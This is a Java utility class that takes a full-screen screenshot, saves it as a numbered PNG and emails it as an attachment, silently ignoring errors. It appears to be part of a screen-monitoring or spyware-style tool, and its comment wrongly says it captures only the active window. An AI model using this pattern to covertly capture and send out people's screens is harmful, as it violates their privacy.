/*
 * Copyright (C) 2014, 2015 Sanjay Madnani
 *
 * This file is free to use: you can redistribute it and/or modify it under the terms of the 
 * GPL General Public License V3 as published by the Free Software Foundation, subject to the following conditions:
 *                                                                                          
 * The above copyright notice should never be changed and should always included wherever this file is used.
 *                                                                                          
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY.  
 * See the GNU General Public License for more details.                                       
 *
 */
package imageUtil;

import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;

import javax.imageio.ImageIO;

import mailUtil.MailUtil;
import fileUtil.FileUtil;

/**
 * Captures Image of a current active window then save this image in a file and pass this file for mailing purpose.
 * 
 * @author SANJAY
 * @see FileUtil
 * @see MailUtil
 */
public class ImageUtil {
	private static Integer i = 1;
	private static MailUtil mailUtil = new MailUtil();

	public static boolean capturedImage() {
		try {
			File file = FileUtil.createFile(i.toString());

			Robot robot = new Robot();
			Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
			Rectangle screenRectangle = new Rectangle(screenSize);
			BufferedImage image = robot.createScreenCapture(screenRectangle);
			ImageIO.write(image, "png", file);
			robot.delay(80);
			i++;
			if (i > 100)
				i = 1;
			return mailUtil.sendMailWithAttachment(file);
		} catch (Exception e) {
			return false;
		}
	}
}